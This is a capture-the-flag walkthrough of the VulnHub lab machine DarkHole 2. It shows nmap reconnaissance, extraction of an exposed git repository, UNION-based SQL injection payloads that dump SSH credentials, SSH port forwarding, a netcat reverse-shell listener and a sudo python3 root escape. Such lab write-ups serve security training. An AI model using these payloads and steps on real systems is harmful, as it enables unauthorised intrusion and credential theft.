# Darkhole - 2 — VulnHub

**CTF:** VulnHub  
**Date:** 2025-11-15  
**Category:** misc  
**Difficulty:** Grade 1  

---

## Summary

DarkHole 2 is a hard-rated machine by Jehad Alqurashi that chains together exposed git repository extraction, manual SQL injection, SSH tunneling for lateral movement, and a Python sudo escape to root. Solid box for practicing real-world attack flows.

---

## Reconnaissance

```bash
nmap -sCV -p- 192.168.1.x
```

Open ports:

```
22/tcp  open  ssh     OpenSSH 8.2p1
80/tcp  open  http    Apache 2.4.41
```

The nmap script also flagged something interesting on port 80:

```
http-git: /.git/ — Git repository found!
Last commit message: i changed login.php file for more secure
```

---

## Enumeration — Git Repository Dump

The exposed `.git` directory allowed dumping the entire repository:

```bash
git clone http://192.168.1.x/.git appDarkHole
cd appDarkHole
git log --oneline
```

Reviewed the commit history:

```bash
git show HEAD~1 -- login.php
```

Found hardcoded credentials in an older commit of `login.php`. Used them to log in to the web application.

---

## Exploitation — Manual SQL Injection

After logging in, the dashboard had a user profile page with an `id` parameter. Tested for SQLi:

```
/dashboard.php?id=1'
```

Confirmed injection. Determined column count:

```
/dashboard.php?id=1' order by 6-- -
```

Found reflected columns (2, 3, 5, 6). Enumerated tables:

```
/dashboard.php?id=NULL' UNION ALL SELECT 1,GROUP_CONCAT(table_name),3,4,5,6 
FROM information_schema.tables WHERE table_schema='darkhole_2'-- -
```

Found tables: `ssh`, `users`.

Dumped SSH credentials:

```
/dashboard.php?id=NULL' UNION ALL SELECT 1,user,pass,4,5,6 FROM ssh-- -
```

Got credentials for user **jehad**.

---

## Initial Access — SSH as jehad

```bash
ssh jehad@192.168.1.x
```

Read the first user flag.

---

## Lateral Movement — Port Forwarding to losy

Checked `.bash_history`:

```bash
cat ~/.bash_history
```

Found that `jehad` had connected to `127.0.0.1:9999` and created a reverse shell there. This hinted at a service running internally for user `losy`.

Set up SSH local port forwarding:

```bash
ssh -L 9999:127.0.0.1:9999 jehad@192.168.1.x -N
```

Browsed to `http://127.0.0.1:9999` — found a web app running as `losy`. Exploited it (command injection or file upload) to get a reverse shell as `losy`:

```bash
nc -lvnp 5555
```

Triggered the payload via the internal web app.

---

## Privilege Escalation — Python Sudo Escape

Checked sudo permissions as `losy`:

```bash
sudo -l
```

Output:

```
(root) /usr/bin/python3
```

Used GTFOBins to escape:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

Got a root shell.

```bash
cat /root/root.txt
```

---

## Flags

- **User flag (jehad)** — found in jehad's home directory
- **User flag (losy)** — found in losy's home directory
- **Root flag** — `/root/root.txt`
